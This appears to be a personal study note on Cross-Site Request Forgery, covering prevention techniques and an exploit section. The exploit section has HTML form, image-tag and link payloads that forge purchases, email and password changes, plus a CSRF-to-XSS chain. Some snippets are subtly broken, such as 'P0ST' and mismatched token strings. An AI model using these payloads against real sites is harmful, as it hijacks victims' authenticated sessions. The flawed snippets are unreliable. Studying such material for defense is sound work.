---
tags:
  - NBBC
  - CyberSec
  - Vulns/Web
---
A **Cross-Site Request Forgery** (CSRF) vulnerability allows an attacker to unknowingly perform state changes on a web application where the victim is authenticated. CSRF does not allow theft of any data, since the attacker has no way to see the response from the webpage.
CSRF takes advantage of the trust a web application has in the user’s browser.

CSRF attacks typically affect applications (or websites) that rely on a user’s identity. Attackers can trick the user’s browser into sending HTTP requests to a target website. An example of a CSRF attack is a user authenticated by the application through a cookie saved in the browser unwittingly sending an HTTP request to a site that trusts the user, subsequently triggering an unwanted action.
## How CSRF Works:
1. **User logs in** to a trusted website (e.g., bank.com) and receives a session cookie.
2. Without logging out, the user visits a **malicious site** crafted by an attacker.
3. That site sends a request (like a money transfer) to `bank.com`, using the user’s **browser and session cookie**.
4. `bank.com` thinks the request is legitimate because it includes a **valid session**.
### How to Prevent CSRF:
1. CSRF Tokens:
    - Generate a unique token per session or request.
    - Include it in forms or headers.
    - Server validates the token before processing the request.
2. SameSite Cookies:
    - Prevents cookies from being sent with cross-site requests.
	Types:
	- `SameSite=Lax`: Sends cookies on top-level navigations and GETs.
	- `SameSite=Strict`: Sends cookies only from the same site.
	- `SameSite=None; Secure`: Sends cookies in all contexts but requires HTTPS.
3. Check Referer/Origin Headers:
    - Only accept requests with trusted `Origin` or `Referer` headers.
4. Use of Authorization Headers (Tokens)
	- For APIs: Instead of using cookies, authenticate via `Authorization: Bearer <token>`. (eg: by using JWTs)
## Exploit
### No CSRF token 
	`GET https://cryptosite.com/buy.php?wallet=something&amount=100&type=BTC`
	Exploit:
	An Image tag: `<img/src="http://cryptosite.com/buy.php?wallet=something&amount=100&type=BTC">`
	A Hyperlink: `<a/href="http:cryptosite.com/buy.php?wallet=something&amount=100type=BTC>FREE BTC</a> ;`

Examples:
- GET request action (Update notification pref)
	host a file (preferably in a https server) having malicious action, like: & invoke it from there
```html
<form method="get" action="domain.com/notifications" target="frm">
	<input type=hidden name="enabled" value="true">
	<input type=submit value="send">
</form>
 OR	
`<a href=https://domain.com/notifications?enabled=false">`
```
- POST request (Change email)
```html
<form method="POST" action="domain.com/email" >
	<input type=hidden name="email" value="newemail@domain.com">
	<input type=submit value="send">
</form>
```

### With CSRF token
- Reusable / guessable CSRF token
	```
	POST http://cryptosite.com/buy.php HTTP/1.1
	wallet=1337hacker&amount=100&type=BTC&xsrf_token=e3VzZXJfaWQSNDRS
	```
	Exploit
```html
	<form action="http://cryptosite.com/buy.php" method="P0ST">
	<input type="hidden" name="wallet" value="1337hacker"/>
	<input type="hidden" name="amount" value="100"/>
	<input type="hidden" name="type" value="BTC"/>
	<input type="hidden" name="xsrf_token" value="e3VzZXJfaW(INDRS"/>
	<input type="submit" value="Click here to win"/> </form>
	
	e3VzZXJfaW(QINDRS = {user_id=44} base64 encoded
```
- Try removing the CSRF token parameter, or token value
Example:
- POST request (change password)
``` 
POST website.com /password HTTP/1.1
...
csrf=eyJkYXRhIjp7InVzZXIiOiJiZW4iLCJyYW5kb20iOiJlZWQ4MjA3YzI0YzZkMDYxNWEyMGVjZjAwZDBiYjA0ZiJ9LCJzaWduYXR1cmUiOiI1YzI0ZDdhYjFkOTgwM2U2ZWY4MDVmNzRmOTk4NmMxYSJ9&password=12345678
```
here the token is `{"data":{"user":"ben","random":"eed8207c24c6d0615a20ecf00d0bb04f"},"signature":"5c24d7ab1d9803e6ef805f74f9986c1a"}`

We can also chain CSRF with XSS
Assume there is a post form to change name
```
POST https://website.com /post/
...
name=adam
```
We can add an XSS payload to the name field in the post request
```html
<html> 
<body> 
	<form action="https://website.com/post/" method="POST"> 
		<input type="hidden" name="name" value='0000000"><U>test123<script>alert()</script>'> 
		<input type="submit" value="Submit"> 
	</form> 
</body> 
</html>
```

## CSRF mitigations
CSRF mitigations and defenses are implemented on the server side. 
The paper located at the following link describes several techniques to prevent or mitigate CSRF vulnerabilities: [_https://seclab.stanford.edu/websec/csrf/csrf.pdf_](https://seclab.stanford.edu/websec/csrf/csrf.pdf).